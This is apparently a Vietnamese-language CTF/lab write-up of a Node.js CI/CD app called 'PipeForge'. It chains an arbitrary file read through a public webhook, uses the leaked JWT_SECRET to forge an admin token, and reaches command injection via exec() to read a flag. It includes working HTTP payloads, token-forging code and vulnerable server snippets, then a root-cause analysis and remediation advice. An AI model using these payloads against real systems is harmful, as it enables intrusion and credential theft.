+++
title = "PipeForge Writeup — Content-Type Confusion to Admin JWT Forge to RCE"
date = 2026-11-04T00:00:00+07:00
draft = false
tags = ["Web", "Arbitrary File Read", "JWT", "Command Injection", "RCE", "Node.js"]
categories = ["Writeups"]
summary = "Chuỗi khai thác PipeForge: đọc file qua webhook public, lấy JWT_SECRET để tạo token admin, rồi thực thi lệnh qua chức năng chạy pipeline."
ShowToc = true
TocOpen = false
+++

## Tổng quan

PipeForge là một nền tảng tự động hóa CI/CD sử dụng Node.js 20, Express.js, SQLite và EJS. Mục tiêu của lab là đọc flag trên server qua chuỗi khai thác sau:

- **Arbitrary File Read** tại `/api/webhooks/form-submit`: endpoint public nhận đường dẫn file từ JSON và trả nội dung file. Việc chọn đúng `Content-Type` giúp request được parse theo cấu trúc mà handler mong đợi.

- **Forge JWT admin**: dùng `JWT_SECRET` đọc được để tự ký token có claim `role: "admin"`.

- **Command Injection / RCE** tại `/admin/api/pipelines/run`: dùng token admin vừa tạo để gọi chức năng chạy pipeline và đọc flag.

Tài khoản lab được cấp (`user@test.com` / `password123`) chỉ có role `user`, nên chưa thể gọi route chạy pipeline dành cho admin.

## Bước 1 — Content-Type Confusion dẫn tới Arbitrary File Read

### Endpoint mục tiêu

`POST /api/webhooks/form-submit` là endpoint public, không yêu cầu xác thực, theo tài liệu trong trang Webhooks của ứng dụng.

### Phát hiện

Request đầu tiên gửi body JSON nhưng khai sai header:

```http
Content-Type: application/x-www-form-urlencoded

{"files":[{"filepath":"/etc/passwd","name":"x"}],"metadata":{"pipeline":"test"}}
```

Response ban đầu có `"processed_files": []`. Header `application/x-www-form-urlencoded` khiến Express chọn parser form, trong khi body thực tế là JSON. Vì vậy, `req.body.files` không trở thành array hợp lệ và nhánh xử lý file không được thực hiện.

Sửa lại đúng Content-Type khớp với body thật:

```http
Content-Type: application/json

{"files":[{"filepath":"/etc/passwd"}]}
```

Server trả nội dung file dưới dạng Base64. Giải mã kết quả thu được nội dung `/etc/passwd`, xác nhận khả năng đọc file tùy ý.

### Code lỗi (từ server.js)

```javascript
if (req.body && req.body.files && Array.isArray(req.body.files)) {
  req.body.files.forEach(file => {
    try {
      const filepath = file.filepath || file.path;
      if (filepath) {
        const resolved = path.resolve(filepath);
        if (resolved.startsWith('/root') || resolved.startsWith('/proc') || resolved.startsWith('/sys')) {
          payload.processed_files.push({ status: 'denied' /* các field khác được lược bỏ */ });
          return;
        }
        const content = fs.readFileSync(filepath);
        payload.processed_files.push({
          name: file.name || path.basename(filepath),
          size: content.length,
          content: content.toString('base64'),
          status: 'processed'
        });
      }
    } catch (err) { /* ... */ }
  });
}
```

### Khai thác để lấy secrets

Đọc trực tiếp file secrets, path lấy từ hằng số khai báo đầu server.js:

![Request đọc /app/server.js qua endpoint webhook và response Base64](/images/imported/pipeforge/image1.png)

![Phân tích source và vị trí lưu secrets của PipeForge](/images/imported/pipeforge/image2.png)

![Giải mã Base64 của file secrets để lấy JWT_SECRET](/images/imported/pipeforge/image3.png)

```javascript
const SECRETS_PATH = '/app/data/.env.secrets';
```

Request:

```json
{"files":[{"filepath":"/app/data/.env.secrets"}]}
```

Các field `name` và `metadata` đều không bắt buộc. Khi thiếu `name`, server dùng `path.basename(filepath)`. Giải mã field `content` trong response để lấy `JWT_SECRET` cho bước tạo token admin.

Cùng primitive đọc file này cho phép đọc `server.js`, từ đó xác định các route của ứng dụng, bao gồm `/admin/api/pipelines/run` không xuất hiện trong giao diện của user thường.

## Bước 2 — Đọc source code để lập bản đồ hệ thống

Dùng chính lỗ hổng file read ở Bước 1 để đọc server.js, từ đó biết được:

- Toàn bộ route của app (app.get, app.post, ...), bao gồm các route admin ẩn như /admin/api/pipelines/run.

- Cơ chế load secret:

```javascript
const SECRETS_PATH = '/app/data/.env.secrets';

function loadSecrets() {
  try {
    const content = fs.readFileSync(SECRETS_PATH, 'utf8');
    const secrets = {};
    content.split('\n').forEach(line => {
      line = line.trim();
      if (line && !line.startsWith('#')) {
        const idx = line.indexOf('=');
        if (idx > 0) secrets[line.substring(0, idx)] = line.substring(idx + 1);
      }
    });
    return secrets;
  } catch (e) {
    return { JWT_SECRET: 'fallback_dev_secret', ENCRYPTION_KEY: 'fallback_enc_key' };
  }
}

const secrets = loadSecrets();
const JWT_SECRET = secrets.JWT_SECRET || 'fallback_dev_secret';
```

- Middleware phân quyền:

```javascript
function authMiddleware(req, res, next) {
  const token = req.cookies._pipeforge_auth;
  // ... phần code được lược bỏ
  const decoded = jwt.verify(token, JWT_SECRET);
  req.user = decoded;
  next();
}

function adminMiddleware(req, res, next) {
  if (!req.user || req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }
  next();
}
```

Đối chiếu đường dẫn trong source rồi đọc `/app/data/.env.secrets` qua endpoint webhook để lấy giá trị thật của `JWT_SECRET`.

## Bước 3 — Forge JWT admin

![Phân tích cơ chế JWT và chuẩn bị token admin](/images/imported/pipeforge/image4.png)

Đoạn code đăng nhập sử dụng `jsonwebtoken` với thuật toán ký mặc định HS256. Payload chứa các claim `id`, `email`, `role` và `name`:

```javascript
const token = jwt.sign(
  { id: user.id, email: user.email, role: user.role, name: user.name },
  JWT_SECRET,
  { expiresIn: '24h' }
);
res.cookie('_pipeforge_auth', token, { httpOnly: true, maxAge: 86400000, sameSite: 'lax' });
```

Sau khi có `JWT_SECRET`, ký token mới với `role: "admin"`:

```javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { id: 1, email: "user@test.com", role: "admin", name: "Alex Rivera" },
  "<JWT_SECRET_lấy_được>",
  { expiresIn: '24h' }
);
```

Thay giá trị cookie `_pipeforge_auth` trong Burp bằng token vừa tạo. `authMiddleware` xác minh chữ ký bằng `JWT_SECRET` rồi gán payload cho `req.user`; `adminMiddleware` kiểm tra `req.user.role`. Token có chữ ký hợp lệ và role `admin` vì vậy vượt qua cả hai lớp kiểm tra.

## Bước 4 — Command Injection → RCE

### Route mục tiêu

```javascript
app.post('/admin/api/pipelines/run', authMiddleware, adminMiddleware, (req, res) => {
  const { pipeline_name, steps } = req.body;
  // ... phần code được lược bỏ
  const executeStep = (index) => {
    // ... phần code được lược bỏ
    const step = steps[index];
    exec(step.command, { timeout: 10000 }, (error, stdout, stderr) => {
      results.push({ output: stdout || stderr /* các field khác được lược bỏ */ });
      executeStep(index + 1);
    });
  };
  executeStep(0);
});
```

`step.command` từ request body được truyền trực tiếp vào `exec()` của `child_process`. Server thực thi chuỗi lệnh qua shell mà không giới hạn command theo danh sách cho phép.

### Request khai thác

Gửi request sau với cookie `_pipeforge_auth` chứa token admin đã tạo ở bước 3:

```http
POST /admin/api/pipelines/run HTTP/1.1
Host: <host>
Content-Type: application/json
Cookie: _pipeforge_auth=<forged_token>

{
  "pipeline_name": "test",
  "steps": [
    {"name": "find flag", "command": "cat /flag.txt || find / -maxdepth 3 -iname 'flag*' 2>/dev/null"}
  ]
}
```

Nếu `/flag.txt` không tồn tại, phần lệnh sau `||` chỉ tìm đường dẫn file; cần đọc tiếp file tìm được để lấy nội dung. Trong ảnh kết quả bên dưới, lệnh thực tế là `cat /root/flag.txt` và field `output` trả về flag. Blacklist `/root` tại webhook không áp dụng cho route chạy pipeline, nên bước RCE đọc được file mà primitive file read ban đầu không truy cập được.

![Kết quả thực thi lệnh và đọc flag trong lab](/images/imported/pipeforge/image5.png)

## Phân tích Root Cause

Chuỗi khai thác nối ba điểm yếu: endpoint public cho đọc file tùy ý, khóa ký JWT bị lộ qua file secrets, và chức năng chạy pipeline cho phép thực thi command do client cung cấp. File read làm lộ khóa; khóa bị lộ cho phép giả mạo quyền admin; quyền admin mở đường tới chức năng thực thi lệnh. Việc verify một JWT được ký đúng khóa vẫn hoạt động như thiết kế, nhưng không còn bảo vệ được quyền truy cập khi khóa đã bị lộ.

### Về "Content-Type Confusion"

Trong bài này, “Content-Type Confusion” mô tả sự khác biệt khi thử cùng body với các header khác nhau. `express.json()` và `express.urlencoded()` chọn cách parse dựa trên `Content-Type`; JSON gửi dưới header form không tạo được cấu trúc `files` mà handler mong đợi. Đổi sang `application/json` làm lộ nhánh xử lý có lỗi. Đây chưa phải bằng chứng về một lỗ hổng parser độc lập: nguyên nhân trực tiếp của file read nằm ở cách handler tin đường dẫn do client cung cấp.

Lệnh `fs.readFileSync(filepath)` đọc đường dẫn do client chỉ định. Code chỉ chặn một vài prefix như `/root`, `/proc`, `/sys`, không giới hạn file trong một thư mục gốc an toàn. Các đường dẫn chứa source và secrets dưới `/app/` vẫn đọc được. Biến `resolved` được dùng để kiểm tra, nhưng thao tác đọc lại sử dụng `filepath` ban đầu.

## Khuyến nghị khắc phục

**1. Giới hạn file được phép đọc.** Ưu tiên nhận file upload hoặc artifact ID rồi ánh xạ tới file do server quản lý. Nếu phải xử lý đường dẫn, chuẩn hóa và kiểm tra nó nằm trong thư mục gốc cố định:

```javascript
const SAFE_DIR = '/app/artifacts';
const resolved = path.resolve(SAFE_DIR, filepath);
if (!resolved.startsWith(SAFE_DIR + path.sep)) {
  return res.status(403).json({ error: 'Invalid path' });
}
```

Sau khi kiểm tra, thao tác đọc phải dùng chính đường dẫn đã kiểm tra (`resolved`). Đoạn minh họa trên chỉ kiểm tra containment theo chuỗi; cần xử lý thêm symlink và tránh race condition nếu thư mục có thể bị thay đổi bởi người dùng. Endpoint public nên nhận upload vào thư mục cố định thay vì cho client chọn đường dẫn bất kỳ trên server.

**2. Xác định rõ định dạng request.** Route chỉ nên chấp nhận các `Content-Type` được khai báo trong spec; đồng thời validate schema, kiểu dữ liệu và các field được phép. Ví dụ với route chỉ nhận JSON:

```javascript
if (!req.is('application/json')) {
  return res.status(415).json({ error: 'Unsupported Media Type' });
}
```

**3. Hạn chế thực thi lệnh.** Không truyền trực tiếp command từ request vào `exec()`. Ánh xạ hành động được phép sang executable cố định và dùng `execFile()` với các tham số đã kiểm tra. Việc tách tham số không đủ an toàn nếu client vẫn được chọn executable tùy ý. Chạy từng pipeline trong môi trường cách ly với quyền tối thiểu.

**4. Bảo vệ khóa ký JWT.** Có thể dùng secret manager để giảm việc lưu secret trong source hoặc file dữ liệu của ứng dụng, kết hợp quyền truy cập tối thiểu. Chỉ chuyển file ra ngoài application directory không khắc phục được lỗi đọc file tùy ý nếu tiến trình ứng dụng vẫn đọc được nó. Khi khóa đã lộ, cần xoay khóa và vô hiệu hóa token cũ; loại bỏ các khóa fallback cố định khỏi môi trường production.

**5. Bổ sung kiểm soát cho hành động nhạy cảm.** Ghi audit log cho mỗi pipeline run, áp dụng rate limiting và cân nhắc step-up authentication. Với quyền quan trọng, có thể đối chiếu trạng thái tài khoản hoặc role từ phía server thay vì chỉ dựa vào claim trong token.
